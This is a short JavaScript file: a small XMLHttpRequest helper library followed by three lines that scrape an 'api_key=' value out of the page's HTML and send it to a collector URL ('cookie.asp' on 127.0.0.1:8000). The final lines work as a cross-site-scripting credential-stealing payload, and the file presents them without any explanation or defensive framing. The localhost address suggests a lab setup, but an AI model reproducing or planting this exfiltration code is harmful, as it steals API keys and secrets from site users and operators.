var http = {};

http.quest = function (option, callback) {
    var url = option.url;
    var method = option.method;
    var data = option.data;
    var timeout = option.timeout || 0;

    var xhr = new XMLHttpRequest();
    (timeout > 0) && (xhr.timeout = timeout);
    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4) {
            if (xhr.status >= 200 && xhr.status < 400) {
            var result = xhr.responseText;
            try {result = JSON.parse(xhr.responseText);} catch (e) {}
                callback && callback(null, result);
            } else {
                callback && callback('status: ' + xhr.status);
            }
        }
    }.bind(this);
    xhr.open(method, url, true);
    if(typeof data === 'object'){
        try{
            data = JSON.stringify(data);
        }catch(e){}
    }
    xhr.send(data);
    xhr.ontimeout = function () {
        callback && callback('timeout');
        console.log('timeout');
    };
};

http.get = function (url, callback) {
    var option = url.url ? url : { url: url };
    option.method = 'get';
    this.quest(option, callback);
};

http.post = function (option, callback) {
    option.method = 'post';
    this.quest(option, callback);
};
var api = document.getElementsByTagName('html')[0].innerHTML.match(/api_key=[^(].+? /g)[0]
var url = 'http://127.0.0.1:8000/cookie.asp?msg='+api
http.get(url,function(err,result){});

